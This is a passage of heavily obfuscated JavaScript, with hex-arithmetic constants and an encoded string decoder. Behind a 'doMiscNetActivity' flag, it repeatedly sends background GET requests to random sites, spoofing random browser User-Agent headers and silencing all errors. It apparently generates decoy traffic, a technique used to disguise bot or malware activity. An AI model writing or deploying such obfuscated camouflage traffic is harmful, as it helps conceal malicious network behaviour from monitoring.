    setTimeout(f, (0x1079f * -0x1 + 0x1a693 + -0x12db * -0x4) * k * getRandomInt(0x235d + 0x14db * 0x1 + -0x3837, -0x995 * 0x2 + -0x1 * -0xdb5 + 0x578));
  setInterval(() => {
    f();
    for (let l = 0x5f * 0x29 + 0x20e * -0x9 + -0x347 * -0x1; l < 0x245c * 0x1 + -0x1 * -0x2030 + 0x158 * -0x33; l++)
      setTimeout(f, (0x7 * -0x395 + 0xe847 + 0x1b2c) * l * getRandomInt(-0x2bd + -0xc4b * 0x3 + -0x1 * -0x279f, 0x3 * 0x9e + 0x1 * -0x4ef + 0x2c * 0x12));
  }, -0x45ce59 + 0x18999d + 0x24 * 0x2c817);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a6 = b,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': a6(0x5, 'CV0d')
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x32b2 + -0x322 * 0xe + 0x8b5 * 0xe) * getRandomInt(-0x2490 + 0x4 * -0x70d + 0x40c5, 0x25f * -0x5 + 0x1ea * -0xe + 0x26ac));
}, 0x1e7c + -0x1 * 0x11ca + -0xc4e);